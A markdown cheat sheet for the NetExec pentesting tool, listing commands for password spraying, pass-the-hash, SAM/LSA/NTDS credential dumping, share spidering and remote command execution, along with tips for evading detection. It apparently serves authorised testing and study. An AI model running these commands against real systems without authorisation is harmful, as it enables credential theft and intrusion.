
---

# 🧠 NetExec (`nxc`) Cheat Sheet



!!!!!!
> [!WARNING] Try crackmapexec first,msfconsole is best for bruteforcing smb
> Contents

---

> [!info] 🧩 Basic Syntax
>
> ```bash
> netexec <protocol> <target> [options]
> ```
>
> **Examples**
>
> ```bash
> netexec smb 10.10.10.10
> netexec ssh 192.168.1.0/24
> netexec winrm target.local
> ```

---

> [!tip] 🎯 Supported Protocols
>
> ```bash
> smb
> mssql
> wmi
> winrm
> ssh
> ftp
> rdp
> ldap
> nfs
> vnc
> ```
>
> 💡 Always pick protocol based on open ports (Nmap first!)

---

# ⚙️ Core Options

---

> [!info] ⚡ Performance / Speed
>
> ```bash
> -t 50                # threads (default ~10)
> --timeout 5          # timeout per connection
> --jitter 2           # delay between attempts
> ```
>
> 💡 Reduce detection by adding jitter

---

> [!tip] 📊 Output Control
>
> ```bash
> --no-progress
> --log results.txt
> --verbose
> --debug
> ```
>
> 💡 Always log during engagements

---

> [!info] 🌐 DNS / Network
>
> ```bash
> -6                          # IPv6
> --dns-server 8.8.8.8
> --dns-tcp
> --dns-timeout 3
> ```

---

# 🔐 Authentication

---

> [!success] 🔑 Username & Password
>
> ```bash
> -u user
> -p password
> ```
>
> ```bash
> netexec smb 10.10.10.10 -u admin -p password123
> ```

---

> [!tip] 📂 Credential Lists
>
> ```bash
> -u users.txt
> -p passwords.txt
> ```
>
> 💡 Enables password spraying

---

> [!danger] 🧨 Pass-the-Hash
>
> ```bash
> -u admin -H <NTLM_HASH>
> ```
>
> ```bash
> netexec smb target -u admin -H aad3b435b51404eeaad3b435b51404ee
> ```

---

> [!tip] 🎫 Kerberos Auth
>
> ```bash
> -k                # use Kerberos
> --aesKey <key>
> --dc-ip <DC_IP>
> ```
>
> 💡 Useful in domain environments

---

# 🖥️ SMB (MOST IMPORTANT)

---

> [!success] 🔍 Basic SMB Scan
>
> ```bash
> netexec smb 10.10.10.10
> ```

---

> [!tip] 👤 Authenticated Check
>
> ```bash
> netexec smb 10.10.10.10 -u user -p pass
> ```

---

> [!info] 📁 Enumerate Shares
>
> ```bash
> netexec smb target -u user -p pass --shares
> ```

---

> [!tip] 👥 Enumerate Users
>
> ```bash
> --users
> ```

---

> [!tip] 🏢 Enumerate Domain Info
>
> ```bash
> --groups
> --local-groups
> --sessions
> ```

---

> [!danger] 🧨 Dump Credentials (HIGH VALUE)
>
> ```bash
> --sam
> --lsa
> --ntds
> ```
>
> 💡 Requires admin privileges

---

> [!tip] 📂 Spider Shares (File Hunting)
>
> ```bash
> --spider C$ --pattern password
> ```
>
> 💡 Find sensitive files fast

---

# 🪟 WINRM (Remote Command Execution)

---

> [!success] ⚡ Command Execution
>
> ```bash
> netexec winrm target -u user -p pass -x "whoami"
> ```

---

> [!tip] 🧠 PowerShell Execution
>
> ```bash
> -X "Get-Process"
> ```

---

# 🧬 WMI (Stealthy Execution)

---

> [!info] ⚡ Run Command via WMI
>
> ```bash
> netexec wmi target -u user -p pass -x "whoami"
> ```
>
> 💡 Quieter than SMB exec sometimes

---

# 🗄️ MSSQL

---

> [!success] 🔍 Connect & Enumerate
>
> ```bash
> netexec mssql target -u sa -p password
> ```

---

> [!tip] ⚡ Execute Query
>
> ```bash
> -q "SELECT @@version"
> ```

---

# 🔐 SSH

---

> [!success] 🔑 Login Attempt
>
> ```bash
> netexec ssh target -u user -p pass
> ```

---

> [!tip] ⚡ Execute Command
>
> ```bash
> -x "id"
> ```

---

# 📡 FTP

---

> [!info] 🔍 FTP Login Check
>
> ```bash
> netexec ftp target -u user -p pass
> ```

---

# 🧪 LDAP (Active Directory Goldmine)

---

> [!success] 🔍 Enumerate AD
>
> ```bash
> netexec ldap target -u user -p pass
> ```

---

> [!tip] 👥 Dump Users
>
> ```bash
> --users
> ```

---

# ⚡ Real-World Workflows

---

> [!success] 🧨 Nmap → NetExec
>
> ```bash
> nmap -p 445 target
> ```
>
> ```bash
> netexec smb target
> ```

---

> [!danger] 💥 Password Spraying
>
> ```bash
> netexec smb 10.10.10.0/24 -u users.txt -p Password123
> ```
>
> 💡 Low and slow → avoid lockouts

---

> [!tip] 🧠 Credential Reuse
>
> ```bash
> netexec smb targets.txt -u admin -p password
> ```
>
> 💡 Try same creds everywhere

---

> [!success] 🔓 Full Attack Chain
>
> ```bash
> netexec smb target -u user -p pass --shares
> netexec smb target -u user -p pass --sam
> netexec winrm target -u user -p pass -x "whoami"
> ```

---

# 🧠 Mental Model

---

> [!quote] 🎯 Think Like This
>
> ```bash
> netexec <protocol> <target> <creds> <action>
> ```
>
> **Example**
>
> ```bash
> netexec smb 10.10.10.10 -u admin -p pass --shares
> ```

---

> [!warning] 🚨 Pro Tips
>
> * Always scan first (**Nmap → NetExec**)
> * SMB is the **most valuable protocol**
> * Try:
>
>   ```bash
>   --shares
>   --users
>   --sam
>   ```
> * Use **low threads + jitter** in real engagements
> * Reuse credentials across protocols
> * Log everything:
>
>   ```bash
>   --log output.txt
>   ```

---

